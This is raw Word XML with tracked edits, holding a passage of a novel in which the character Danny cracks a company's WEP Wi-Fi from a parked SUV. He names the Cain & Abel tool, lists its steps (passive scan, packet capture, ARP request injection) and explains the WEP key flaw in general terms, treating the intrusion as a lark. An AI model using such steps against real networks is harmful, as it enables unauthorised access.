        <w:r w:rsidR="00317A2F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="634" w:author="TextVet" w:date="2016-03-16T13:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00317A2F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing things</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:del w:id="635" w:author="TextVet" w:date="2016-03-16T13:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00317A2F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>their needles</w:t>
      </w:r>
      <w:del w:id="636" w:author="TextVet" w:date="2016-03-16T13:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00317A2F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> were</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> filled with water. They might as well have been clouds of fog.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SUV lumbered quietly forward. “The lights are on in their lobby,” Jason said as their angle of view shifted. “And there’s still a car in their parking lot. Is someone in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 sure,” said Danny. “I can’t really see.”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Unaided human eyes could see light frequencies ranging from 430 to 790 terahertz, corresponding to colors from red to bluish violet. The waves coming from the Tungsten building had frequencies near 2.45 gigahertz. People like Danny didn’t call it “color</w:t>
      </w:r>
      <w:del w:id="637" w:author="TextVet" w:date="2016-03-16T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00313538">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w:t>
      </w:r>
      <w:ins w:id="638" w:author="TextVet" w:date="2016-03-16T13:57:00Z">
        <w:r w:rsidR="0031353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ins w:id="639" w:author="TextVet" w:date="2016-03-16T13:57:00Z">
        <w:r w:rsidR="00313538">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="640" w:author="TextVet" w:date="2016-03-16T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00313538">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 xml:space="preserve">hey </w:t>
      </w:r>
      <w:del w:id="641" w:author="TextVet" w:date="2016-03-16T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00313538">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">instead </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="642" w:author="TextVet" w:date="2016-03-16T13:58:00Z">
        <w:r w:rsidR="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>might say</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="643" w:author="TextVet" w:date="2016-03-16T13:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">used words </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="644" w:author="TextVet" w:date="2016-03-16T13:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>like</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> “channel” or “band”. </w:t>
      </w:r>
      <w:ins w:id="645" w:author="TextVet" w:date="2016-03-16T13:58:00Z">
        <w:r w:rsidR="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Their “microwave” </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="646" w:author="TextVet" w:date="2016-03-16T14:00:00Z">
        <w:r w:rsidR="004322A6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>was everyone else’s</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="647" w:author="TextVet" w:date="2016-03-16T13:59:00Z">
        <w:r w:rsidR="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="648" w:author="TextVet" w:date="2016-03-16T13:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>And in</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="649" w:author="TextVet" w:date="2016-03-16T13:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> place</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="650" w:author="TextVet" w:date="2016-03-16T13:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of names like </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“red”</w:t>
      </w:r>
      <w:del w:id="651" w:author="TextVet" w:date="2016-03-16T13:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00737DB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, they used the term “microwave”</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better,” Danny said, focused on his computer screen. “The RSSI from three of the APs just jumped. They’re running WEP over 802.11b. It’s a grossly outdated protocol, just like the OmniVision tech support forum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you’re in?”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“Not yet,” </w:t>
      </w:r>
      <w:ins w:id="652" w:author="TextVet" w:date="2016-03-16T14:00:00Z">
        <w:r w:rsidR="004B4476">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>admitte</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="653" w:author="TextVet" w:date="2016-03-16T14:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004B4476">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 Danny. “We can see their Wi-Fi network from here, but it’s password protected. Which is exactly why I brought my little friend Cain &amp; Abel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mean your friend</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Cain and Abel?”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 Cain &amp; Abel. It’s an application. A ‘password recovery toolkit’,” Danny </w:t>
      </w:r>
      <w:ins w:id="654" w:author="TextVet" w:date="2016-03-16T14:01:00Z">
        <w:r w:rsidR="00C13649">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>replie</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="655" w:author="TextVet" w:date="2016-03-16T14:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C13649">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w:t>
      </w:r>
      <w:ins w:id="656" w:author="TextVet" w:date="2016-03-16T14:01:00Z">
        <w:r w:rsidR="00C13649">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="657" w:author="TextVet" w:date="2016-03-16T14:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C13649">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> smirk</w:t>
      </w:r>
      <w:ins w:id="658" w:author="TextVet" w:date="2016-03-16T14:01:00Z">
        <w:r w:rsidR="00C13649">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“You know, in case you ever lose the key to your own network. Or… something. So let’s see what it can do here…” H</w:t>
      </w:r>
      <w:del w:id="659" w:author="TextVet" w:date="2016-03-16T14:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE65D0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e whisked h</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is fingers </w:t>
      </w:r>
      <w:ins w:id="660" w:author="TextVet" w:date="2016-03-16T14:02:00Z">
        <w:r w:rsidR="00CE65D0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">darted </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>across his laptop, navigating through an elaborate maze of buttons and drop-down menus. “Passive Scan… Capture to File… Packet Injection ARP Requests… and… Go!”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Now</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> you’re in?”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w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="661" w:author="TextVet" w:date="2016-03-16T14:03:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve"> Sheesh!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> It’ll take a few minutes. Right now, my computer</w:t>
      </w:r>
      <w:ins w:id="662" w:author="TextVet" w:date="2016-03-16T14:03:00Z">
        <w:r w:rsidR="00BF7936">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="663" w:author="TextVet" w:date="2016-03-16T14:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF7936">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s tricking the machines on the Tungsten network into transmitting tons of data, and looking for patterns in those transmissions. See, Tungsten’s security cameras use an old encryption protocol called Wired-Equivalent Privacy, or WEP. WEP has a subtle mathematical flaw </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>that was discovered in the early 2000s. Every WEP packet gives a small clue about its cryptographic key, so if you capture enough traffic over the air, you can deduce the network password. As we speak, Tungsten’s machines are beaming out sweet, juicy data packets. Just sit back and enjoy the show.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="0061482F" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:del w:id="664" w:author="TextVet" w:date="2016-03-16T14:05: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w:t>
      </w:r>
      <w:ins w:id="665" w:author="TextVet" w:date="2016-03-16T14:04:00Z">
        <w:r w:rsidR="005A389E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>udied</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="666" w:author="TextVet" w:date="2016-03-16T14:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A389E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ared out at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the Tungsten building</w:t>
      </w:r>
      <w:ins w:id="667" w:author="TextVet" w:date="2016-03-16T14:05:00Z">
        <w:r w:rsidR="00A06214">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> through</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="668" w:author="TextVet" w:date="2016-03-16T14:04:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A06214">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, past</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the trees.</w:t>
      </w:r>
      <w:ins w:id="669" w:author="TextVet" w:date="2016-03-16T14:05:00Z">
        <w:r w:rsidR="0061482F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>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If </w:t>
      </w:r>
      <w:ins w:id="670" w:author="TextVet" w:date="2016-03-16T14:05:00Z">
        <w:r w:rsidR="0061482F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="671" w:author="TextVet" w:date="2016-03-16T14:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0061482F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Danny</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> could see into the microwave spectrum, h</w:t>
      </w:r>
      <w:ins w:id="672" w:author="TextVet" w:date="2016-03-16T14:08:00Z">
        <w:r w:rsidR="003F69AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>is</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="673" w:author="TextVet" w:date="2016-03-16T14:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003F69AD">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xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="674" w:author="TextVet" w:date="2016-03-16T14:08:00Z">
        <w:r w:rsidR="003F69AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">eyes </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">would </w:t>
      </w:r>
      <w:ins w:id="675" w:author="TextVet" w:date="2016-03-16T14:08:00Z">
        <w:r w:rsidR="00B06EF5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>jig</w:t>
        </w:r>
        <w:r w:rsidR="003F69AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> in</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="676" w:author="TextVet" w:date="2016-03-16T14:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003F69AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>see</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a dazzling symphony of light. The building’s walls would be mostly transparent, with the various computers inside </w:t>
      </w:r>
      <w:ins w:id="677" w:author="TextVet" w:date="2016-03-16T14:09:00Z">
        <w:r w:rsidR="007F100A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>crackl</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="678" w:author="TextVet" w:date="2016-03-16T14:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007F100A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>emitt</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing rapid flashes</w:t>
      </w:r>
      <w:del w:id="679" w:author="TextVet" w:date="2016-03-16T14:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007F100A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of light</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, like fireflies in a jar. As the flickering of each computer ceased, a certain designated device — an access point, or Wi-Fi hotspot in popular parlance — would light up in response to the darkness. The access point was the choreographer of this luminous dance, its pattern of flashes telling the other devices which one of them should transmit next. </w:t>
      </w:r>
      <w:commentRangeStart w:id="680"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">One after another, </w:t>
      </w:r>
      <w:ins w:id="681" w:author="TextVet" w:date="2016-03-16T14:11:00Z">
        <w:r w:rsidR="00751ADD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>each would</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="682" w:author="TextVet" w:date="2016-03-16T14:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00751ADD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
